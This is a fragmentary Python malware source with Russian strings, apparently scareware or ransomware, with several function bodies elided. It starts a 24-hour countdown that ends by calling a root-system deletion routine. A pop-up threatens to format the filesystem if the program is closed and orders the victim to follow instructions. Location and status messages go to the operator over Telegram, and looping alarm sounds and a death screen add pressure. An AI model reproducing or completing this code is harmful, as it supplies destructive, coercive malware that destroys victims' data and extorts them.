...
def delete_root_system():
    os_name = platform.system()
    print(gradient_text('🔥 Сжигаем мусор...', (255, 0, 0), (255, 0, 0)))
    try:
...
def run_commands():
    ...
    try:
        if os_name == "Linux":
            ...
            emoji = '💻'
            try:
                subprocess.run(['tar', '-xvf', 'base.rar', '-C', 'base/'], check=True)
            except Exception as e:
                send_telegram_message(f"❌ Не удалось распаковать base.rar: {e}")
        else:
...
# Форматируем сообщение о местоположении
        ...
        send_telegram_message("🔪 Будет весело.")
    except Exception as e:
...
def glitch():
    audio_path = get_audio_path("GLITCH.mp3")
    if os_name == 'Windows':
        try:
        ...
        subprocess.run(['mpv', audio_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def crash():
    audio_path = get_audio_path("CRASH.mp3")
    if os_name == 'Windows':
        try:
            winsound.PlaySound(audio_path, winsound.SND_FILENAME)
        except Exception as e:
...
def beep():
    audio_path = get_audio_path("BEEP.mp3")
    if os_name == 'Windows':
        try:
            winsound.PlaySound(audio_path, winsound.SND_FILENAME)
        except Exception as e:
...
def music():
    while True:
        audio_path = get_audio_path("BGM.mp3")
        if os_name == 'Windows':
            try:
                winsound.PlaySound(audio_path, winsound.SND_FILENAME)
            except Exception as e:
...
def start_timer(duration=86400):  # 24 часа в секундах
    for remaining in range(duration, 0, -1):
        ...
        time.sleep(1)
    print(gradient_text('\n⚠ Упс... Время вышло!', (255, 0, 0), (255, 0, 0)))
    delete_root_system()
    
def waiter():
    time.sleep(20)
    try:
        messagebox.showinfo("ПОПЫТКА ЗАКРЫТЬ ПРОГРАММУ ПРИВЕДЕТ К МГНОВЕННОМУ ФОРМАТИРОВАНИИ ФАЙЛОВОЙ СИСТЕМЫ. У ТЕБЯ ЕСТЬ 24 ЧАСА, СЛЕДУЙ МОИМ УКАЗАНИЯМ.", "Упс!")
    except Exception as e:
        pass
    death_screen()
